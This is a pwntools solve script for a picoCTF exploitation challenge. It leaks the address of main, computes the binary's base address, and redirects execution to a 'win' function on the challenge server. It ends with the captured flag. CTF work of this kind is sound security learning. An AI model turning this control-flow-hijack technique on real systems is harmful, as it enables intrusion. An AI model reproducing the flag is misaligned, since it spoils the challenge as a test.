from pwn import *
elf = context.binary = ELF("./vuln", checksec=False)

#p = process('./vuln')
p = remote("rescued-float.picoctf.net", 51144)

p.recvuntil(b'Address of main: ')

LEAK_ADDR = int(p.recv(14), 16)
log.info("Leak address: " + hex(LEAK_ADDR))
BASE_ADDR = LEAK_ADDR - elf.symbols.main
log.info("Base address: " + hex(BASE_ADDR))
WIN_ADDR = elf.symbols.win + BASE_ADDR
log.info("Win address: " + hex(WIN_ADDR))

p.sendlineafter(b"Enter the address to jump to, ex => 0x12345: ", hex(WIN_ADDR))
response = p.recvall(timeout=1).strip()
print(response.decode())

# picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_a267144a}

p.close()